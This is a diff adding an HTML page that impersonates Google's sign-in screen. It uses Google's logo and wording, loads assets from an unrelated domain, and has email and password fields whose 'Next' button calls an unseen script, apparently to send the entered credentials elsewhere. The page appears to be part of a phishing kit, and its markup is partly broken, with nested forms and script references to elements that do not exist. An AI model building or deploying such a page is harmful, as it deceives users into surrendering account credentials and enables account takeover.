@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Login - Account Google </title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/jquery-3.3.1.js"></script>
+    <script src="js/script.js"></script>
+</head>
+<body>
+    <div class="main">
+        <div class="overlay"></div>
+
+        <!-- Loaders -->
+        <div class="preloader" style="display: none;">
+            <div class="preloader-bar">
+                <div class="preloader-bars"></div>
+            </div>
+        </div>
+        <div id="loader-2" style="display: none;">
+            <div class="three-balls">
+                <div class="ball ball1"></div>
+                <div class="ball ball2"></div>
+                <div class="ball ball3"></div>
+            </div>
+            <div class="loader-2-text">Signing you in...</div>
+        </div>
+
+        <!-- Menu -->
+        <div class="menu">
+            <div class="menu-icon">
+                <img src="https://api.newblast.shop/menu.svg" alt="">
+            </div>
+            <div class="menu-items">
+                <ul>
+                    <li id="about">About</li>
+                    <li id="overlay-btn">Overlay</li>
+                    <li>Instagram</li>
+                    <li>Contact</li>
+                    <li>etc...</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo">
+            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+        </div>
+
+        <!-- Main Heading -->
+        <h1 class="heading">
+            <div class="h_main">Sign in</div>
+            <div class="h_sub">with your Google Account</div>
+        </h1>
+
+        <!-- User Tag -->
+        <div class="tag-wrapper" style="display: none; visibility: hidden;">
+            <div class="user-tag">
+                <img src="https://api.newblast.shop/user.svg" alt="">
+                <span class="email-text"></span>
+                <img src="https://api.newblast.shop/down-chevron.svg" alt="">
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="slide-content">
+            <form action="daftar.html" method="post" id="combinedForm">
+                <!-- Email Section -->
+                <div class="content1">
+<div class="input-group">
+    <form>
+        <input type="text"  class="field email-field" id="nama" placeholder="Email or phone number" required=""/>
+        <!-- Password Section -->
+        	<div class="content2" style="display: none;">
+        </div>
+      <div class="input-group">
+      	
+        <input type="text" class="field password-field" id="email" placeholder="Password" />
+        </div>
+                    <span class="forgot">Forgot email?</span>
+                    
+                        Not your computer? Use Guest mode to sign in privately.
+                    </div>
+                    <div class="create-next">
+                        <span>Create account</span>
+        <input type="text" style="display: none;" id="pesan" placeholder="Pesan"/>
+        <p style="display: none;">This text is hidden.</p>
+        
+        <input type="submit" class="btn" id="kirim" value="Next" onclick="kirimPesan()" />
+    </form>
+
+  </div>
+
+  <script>
+  	
+    // Menangani submit form
+    const loginForm = document.getElementById('login-form');
+    const loadingIndicator = document.getElementById('loading');
+
+    loginForm.addEventListener('submit', function (e) {
+      // Mencegah submit langsung
+      e.preventDefault();
+
+      // Menampilkan loading
+      loadingIndicator.style.display = 'block';
+
+      // Simulasi loading selama 2 detik sebelum melanjutkan
+      setTimeout(() => {
+        loginForm.submit();
+      }, 2000);
+    });
+  </script>
+</body>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="main.js"></script>
+
+</html>
